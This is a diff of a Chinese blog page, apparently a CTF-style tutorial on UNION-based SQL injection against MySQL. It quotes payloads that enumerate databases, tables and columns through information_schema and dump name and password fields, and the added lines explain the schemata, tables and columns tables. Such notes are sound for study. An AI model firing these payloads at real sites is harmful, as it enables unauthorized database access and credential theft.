@@ -87,7 +87,7 @@
 <meta property="og:description" content="and 1=2 union select 1,2,group_concat(distinct table_schema),4 from information_schema.columns and 1=2 union select 1,2,group_concat(distinct table_name),4 from information_schema.columns where table">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://p8hvan4e5.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180513111032.png">
-<meta property="og:updated_time" content="2018-05-13T06:31:30.486Z">
+<meta property="og:updated_time" content="2018-05-13T08:39:09.353Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="高级爆表爆列">
 <meta name="twitter:description" content="and 1=2 union select 1,2,group_concat(distinct table_schema),4 from information_schema.columns and 1=2 union select 1,2,group_concat(distinct table_name),4 from information_schema.columns where table">
@@ -315,6 +315,9 @@
 <p>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’ 爆出flag库下的所有的表，假设其中有flagtable表</p>
 <p>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’爆出flagtable下的所有字段，假设有name和password字段</p>
 <p>and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable爆出flag下的flagtable表的name和password的内容</p>
+<p>mysql 数据库在安装完成后,有一个自带的数据库,  information_schema<br>这个数据库存放的是数据库和数据表的元信息。<br>该数据库下有一张表叫schemata表。<br>这个表记录的是mysql上所有的数据库信息。<br>在information_schema这个数据库下还有一张表叫tables.<br>schemata表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p>
+<p>tables表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p>
+<p>columns表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
 
       
     </div>
@@ -419,7 +422,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
